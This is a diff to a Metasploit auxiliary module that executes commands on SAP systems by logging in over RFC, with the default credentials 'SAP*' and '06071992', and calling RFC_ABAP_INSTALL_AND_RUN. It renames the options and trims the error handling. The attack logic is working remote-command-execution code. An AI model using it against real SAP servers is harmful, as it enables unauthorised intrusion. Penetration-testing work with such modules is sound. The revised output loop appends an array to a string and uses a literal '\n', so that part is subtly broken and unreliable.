@@ -34,27 +34,24 @@ class Metasploit4 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(3342),
-        OptString.new('USER', [true, 'Username', 'SAP*']),
-        OptString.new('PASS', [true, 'Password', '06071992']),
+        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+        OptString.new('PASSWORD', [true, 'Password', '06071992']),
         OptString.new('CMD', [true, 'Command to Execute', 'id']),
       ], self.class)
   end
 
   def run_host(ip)
-    user = datastore['USER']
-    pass = datastore['PASS']
+    user = datastore['USERNAME']
+    pass = datastore['PASSWORD']
     unless datastore['CLIENT'] =~ /^\d{3}\z/
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
     command = datastore['CMD']
-    exec_SYSTEM(user,client,pass,datastore['rhost'],datastore['rport'], command)
+    exec_SYSTEM(user, datastore['CLIENT'],pass,datastore['rhost'],datastore['rport'], command)
   end
 
   def exec_SYSTEM(user, client, pass, rhost, rport, command)
-    vprint_status("#{rhost}:#{rport} [SAP] Trying client: '#{client}' username:'#{user}' password:'#{pass}'")
-
-    begin
-      conn = login(rhost, rport, client, user, pass)
+    login(rhost, rport, client, user, pass) do |conn|
       conn.connection_info
 
       function = conn.get_function("RFC_ABAP_INSTALL_AND_RUN")
@@ -77,29 +74,15 @@ class Metasploit4 < Msf::Auxiliary
 
       begin
         fc.invoke
-        saptbl = Msf::Ui::Console::Table.new(
-                  Msf::Ui::Console::Table::Style::Default,
-                    'Header'  => "[SAP] Command Exec #{rhost}:#{rport}:#{client}",
-                    'Columns' =>
-                              [
-                                "Output"
-                              ])
-
+        data = ''
         fc[:WRITES].each do |row|
-          saptbl << [ row[:ZEILE]]
+          data << [ row[:ZEILE]] << '\n'
         end
 
         print_good("#{rhost}:#{rport} [SAP] Executed #{command}")
-        print(saptbl.to_s)
+        print(data)
       rescue NWError => e
-        print_error("#{rhost}:#{rport} [SAP] FunctionCallException - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
-      end
-
-    rescue NWError => e
-      print_error("#{rhost}:#{rport} [SAP] exec_SYSTEM - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
-    ensure
-      if conn
-        conn.disconnect
+        print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
       end
     end
   end
